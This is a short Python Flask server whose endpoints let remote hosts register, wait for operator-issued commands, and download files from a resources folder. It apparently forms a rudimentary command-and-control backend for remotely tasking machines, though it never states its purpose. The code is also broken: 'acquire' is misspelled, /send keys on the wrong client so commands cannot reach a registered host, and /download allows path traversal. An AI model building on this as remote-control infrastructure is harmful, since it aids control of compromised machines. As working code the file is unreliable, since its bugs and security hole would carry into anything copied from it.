from flask import Flask, request, send_file
import os, time
import requests
import threading

app = Flask(__name__)

hosts = {}

@app.route('/handshake', methods = ['POST'])
def handshake():
  global hosts
  key = (request.remote_addr, request.form['name'])
  hosts[key] = {'lock' : threading.Lock(), 'command' : ''}
  hosts[key]['lock'].aquire()
  return 'Request accepted' 

@app.route('/')
def displayHosts():
  lines = []
  for host in hosts:
    lines.append(f'{host}: {hosts[host]}')
  response = '\n'.join(lines)
  return response

@app.route('/download/<file>')
def download(file):
  path = './resources/' + file
  if os.path.exists(path):
    return send_file(path, as_attachment = True)
  else:
    return "File not found", 404

@app.route('/ready', methods = ['POST'])
def timeout():
  global hosts
  key = (request.remote_addr, request.form['name'])
  hosts[key]['lock'].aquire()
  return hosts[key]['command']

@app.route('/send/<command>')
def send(command):
  global hosts
  key = (request.remote_addr, request.form['name'])
  hosts[key]['command'] = command
  hosts[key]['lock'].release()
  return 'Command sent!'